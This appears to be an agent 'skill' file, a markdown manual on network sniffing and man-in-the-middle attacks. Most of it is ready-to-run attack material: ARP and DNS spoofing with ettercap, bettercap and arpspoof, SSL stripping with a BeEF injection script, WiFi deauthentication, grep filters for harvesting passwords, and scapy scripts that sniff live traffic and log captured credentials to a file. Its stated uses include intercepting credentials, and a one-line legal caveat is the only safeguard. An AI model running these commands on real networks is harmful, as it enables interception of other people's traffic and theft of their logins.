---
name: network-sniffing-mitm
description: Capture and analyze network traffic with packet sniffers.
tags: [sniffing, wireshark, tcpdump, mitm, packet-capture]
version: 1.0
author: RedMess
license: MIT
---

# Network Sniffing & MITM

## When to Use
Use when capturing network packets, analyzing traffic, performing man-in-the-middle attacks, or intercepting credentials.

## Basic Packet Capture

### tcpdump - Command Line Sniffer
```bash
# Capture all traffic on interface
tcpdump -i eth0

# Capture and save to file
tcpdump -i eth0 -w capture.pcap

# Capture specific host
tcpdump -i eth0 host 192.168.1.100

# Capture HTTP traffic only
tcpdump -i eth0 port 80

# Capture with verbose output
tcpdump -i eth0 -vvv

# Filter by source/destination
tcpdump -i eth0 src 192.168.1.50
tcpdump -i eth0 dst 192.168.1.100

# Capture POST requests
tcpdump -i eth0 -s 0 -A 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504F5354'

# Capture passwords (grep for common patterns)
tcpdump -i eth0 -s 0 -A | grep -E 'password=|pass=|pwd='
```

### Wireshark - GUI Packet Analyzer
```bash
# Install Wireshark
apt install wireshark

# Run with root permissions
sudo wireshark

# Common filters:
# HTTP traffic: http
# Specific IP: ip.addr == 192.168.1.100
# TCP port: tcp.port == 8080
# Contains string: frame contains "password"
# Follow TCP stream: right-click packet → Follow → TCP Stream
```

### Capture WiFi Traffic
```bash
# Put WiFi adapter in monitor mode
airmon-ng start wlan0

# Capture WiFi packets
airodump-ng wlan0mon

# Capture specific network
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth clients to capture handshake
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
```

## Man-in-the-Middle (MITM) Attacks

### ARP Spoofing with Ettercap
```bash
# Install ettercap
apt install ettercap-graphical

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoofing attack
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//
# Gateway: 192.168.1.1
# Target: 192.168.1.100

# With GUI
ettercap -G

# Sniff and modify traffic
# Hosts → Scan for hosts
# MITM → ARP poisoning
# Select target 1 (gateway) and target 2 (victim)
# Start → Start sniffing
```

### Bettercap - Modern MITM Framework
```bash
# Install bettercap
apt install bettercap

# Start interactive session
bettercap -iface eth0

# Discover hosts
> net.probe on

# Show discovered hosts
> net.show

# ARP spoofing
> set arp.spoof.targets 192.168.1.100
> arp.spoof on

# Enable HTTP/HTTPS sniffer
> set http.proxy.sslstrip true
> set http.proxy.script /usr/share/bettercap/caplets/beef-inject.js
> http.proxy on

# Capture credentials
> net.sniff on

# DNS spoofing
> set dns.spoof.domains example.com
> set dns.spoof.address 192.168.1.50
> dns.spoof on
```

### mitmproxy - Interactive MITM Proxy
```bash
# Install mitmproxy
pip install mitmproxy

# Start proxy
mitmproxy -p 8080

# Configure target device to use proxy:
# Proxy: 192.168.1.50:8080

# Install mitmproxy CA certificate on target device
# http://mitm.it

# Intercept and modify requests
# Press 'i' to set intercept filter
# Filter: ~d example.com (intercept example.com)
# Press 'a' to accept and forward

# Save traffic
mitmdump -w traffic.dump

# Replay traffic
mitmdump -nc -r traffic.dump

# Python script for auto-modification
# modify_response.py
def response(flow):
    if "example.com" in flow.request.url:
        flow.response.content = flow.response.content.replace(
            b"original", b"modified"
        )

# Run with script
mitmproxy -s modify_response.py
```

## Credential Sniffing

### HTTP Credentials with Wireshark
```bash
# Capture filter
http.request.method == "POST"

# Search for credentials
http contains "password" || http contains "user"

# Extract from POST data
tcp contains "username=" || tcp contains "password="
```

### FTP Credentials
```bash
# tcpdump filter
tcpdump -i eth0 -A | grep -E 'USER|PASS'

# Wireshark filter
ftp.request.command == "USER" || ftp.request.command == "PASS"
```

### Email Credentials (POP3/IMAP/SMTP)
```bash
# POP3
tcpdump -i eth0 -A port 110 | grep -E 'USER|PASS'

# IMAP
tcpdump -i eth0 -A port 143 | grep LOGIN

# SMTP
tcpdump -i eth0 -A port 25 | grep -E 'AUTH|LOGIN'
```

### Extract All Credentials from PCAP
```python
# extract_creds.py
from scapy.all import *

def extract_http_creds(pcap_file):
    packets = rdpcap(pcap_file)
    
    for pkt in packets:
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            payload = pkt[Raw].load.decode('utf-8', errors='ignore')
            
            # HTTP POST credentials
            if 'POST' in payload:
                if 'password=' in payload or 'pass=' in payload:
                    print(f"[+] HTTP Credential: {payload[:200]}")
            
            # FTP credentials
            if 'USER ' in payload or 'PASS ' in payload:
                print(f"[+] FTP Credential: {payload.strip()}")
            
            # Email credentials
            if 'LOGIN' in payload or 'AUTH' in payload:
                print(f"[+] Email Credential: {payload[:150]}")

extract_http_creds('capture.pcap')
```

## SSL/TLS Stripping

### sslstrip - Downgrade HTTPS to HTTP
```bash
# Install sslstrip
apt install sslstrip

# Setup iptables redirect
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Start ARP spoofing
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//

# Start sslstrip
sslstrip -l 8080 -w sslstrip.log

# View captured credentials
cat sslstrip.log
```

### SSL MITM with mitmproxy
```bash
# Start mitmproxy
mitmproxy --mode transparent --showhost

# Setup iptables
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080

# ARP spoof target
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
```

## DNS Spoofing

### dnsspoof - Redirect DNS Queries
```bash
# Install dnsspoof
apt install dsniff

# Create hosts file
cat > dns_hosts << EOF
192.168.1.50 example.com
192.168.1.50 www.example.com
192.168.1.50 login.example.com
EOF

# Start DNS spoofing
dnsspoof -i eth0 -f dns_hosts

# Combined with ARP spoofing
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100// -P dns_spoof
```

## Mobile Traffic Sniffing

### Android App Traffic Capture
```bash
# Method 1: ADB + tcpdump
adb shell
su
tcpdump -i wlan0 -s 0 -w /sdcard/capture.pcap

# Pull capture file
adb pull /sdcard/capture.pcap

# Method 2: mitmproxy
# Install mitmproxy CA on Android
adb push ~/.mitmproxy/mitmproxy-ca-cert.pem /sdcard/
# Settings → Security → Install certificate

# Configure WiFi proxy
# Proxy: 192.168.1.50:8080

# Start mitmproxy
mitmproxy -p 8080
```

### iOS Traffic Capture
```bash
# Method 1: Remote Virtual Interface
rvictl -s UDID

# Capture with tcpdump
tcpdump -i rvi0 -w ios_capture.pcap

# Method 2: Burp Suite Mobile
# Install Burp CA certificate
# Safari → http://burp → Download CA
# Settings → Install Profile

# Configure proxy
# Settings → WiFi → HTTP Proxy → Manual
# Server: 192.168.1.50, Port: 8080
```

## Advanced Techniques

### VLAN Hopping
```bash
# Create 802.1Q tagged interface
vconfig add eth0 10

# Capture VLAN traffic
tcpdump -i eth0.10
```

### IPv6 Sniffing
```bash
# Capture IPv6 traffic
tcpdump -i eth0 ip6

# IPv6 neighbor discovery spoofing
parasite6 eth0
```

### VoIP Sniffing (SIP/RTP)
```bash
# Capture SIP traffic
tcpdump -i eth0 port 5060 -w voip.pcap

# Extract audio with Wireshark
# Telephony → RTP → Show All Streams → Analyze → Save audio
```

## Automated Sniffing Script
```python
# auto_sniff.py
from scapy.all import *
import datetime

def packet_handler(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        payload = str(pkt[Raw].load)
        
        # HTTP credentials
        if 'password=' in payload.lower():
            timestamp = datetime.datetime.now()
            src = pkt[IP].src
            dst = pkt[IP].dst
            print(f"[{timestamp}] {src} → {dst}")
            print(f"[+] Credential found: {payload[:200]}\n")
            
            # Save to file
            with open('creds.txt', 'a') as f:
                f.write(f"{timestamp} | {src} → {dst}\n{payload}\n\n")

# Start sniffing
sniff(iface='eth0', prn=packet_handler, store=0)
```

## Pitfalls
1. **Encrypted traffic** - HTTPS/TLS requires SSL stripping or client-side cert install
2. **Certificate pinning** - Apps with pinning won't trust MITM certs
3. **Network detection** - ARP spoofing detectable by network monitoring tools
4. **Legal issues** - Packet sniffing without permission is illegal
5. **MAC filtering** - Some networks restrict by MAC address

## Verification
```bash
# Test ARP spoofing
arp -a | grep "at.*ether"  # Check if MAC addresses are duplicated

# Verify IP forwarding
cat /proc/sys/net/ipv4/ip_forward  # Should be 1

# Test MITM position
ping 8.8.8.8  # From victim, should still work
```

## Related Skills
- blackhat-hacking
- web-pentesting-tools
- api-pentesting